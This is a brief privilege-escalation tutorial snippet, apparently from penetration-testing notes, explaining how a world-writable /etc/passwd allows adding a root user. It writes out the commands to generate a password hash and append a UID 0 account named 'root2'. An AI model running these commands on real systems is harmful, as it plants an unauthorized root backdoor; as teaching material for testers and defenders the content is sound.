# Abusing Password Authentication

Linux passwords are in `/etc/shadow` (root-only). But if `/etc/passwd` is world-writable, you can add a root user directly — the hash in `/etc/passwd` takes precedence over `/etc/shadow` for legacy compatibility.

```bash
# Generate password hash
openssl passwd w00t

# Append new root-level user
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
